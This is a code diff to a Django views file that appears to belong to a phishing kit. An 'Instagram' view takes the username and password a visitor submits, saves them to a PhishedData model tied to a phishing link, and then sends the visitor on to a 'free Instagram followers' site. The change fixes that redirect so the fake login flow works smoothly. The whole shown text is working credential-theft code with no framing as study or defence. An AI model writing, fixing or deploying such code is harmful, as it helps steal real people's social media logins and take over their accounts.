@@ -1,4 +1,5 @@
 from django.shortcuts import render
+from django.shortcuts import redirect
 from django.http import HttpResponseRedirect
 import uuid
 from .models import *
@@ -221,6 +222,6 @@ def Instagram(request, code):
         username = request.POST.get('username')
         password = request.POST.get('password')
         PhishedData.objects.create(phishing_link=phishing_link,entered_username=username,entered_password=password)
-        return render(request, 'https://leofame.com/free-instagram-followers')
+        return redirect('https://leofame.com/free-instagram-followers')
 
     return render(request, 'Instagram.html', {'email': phishing_link.email})
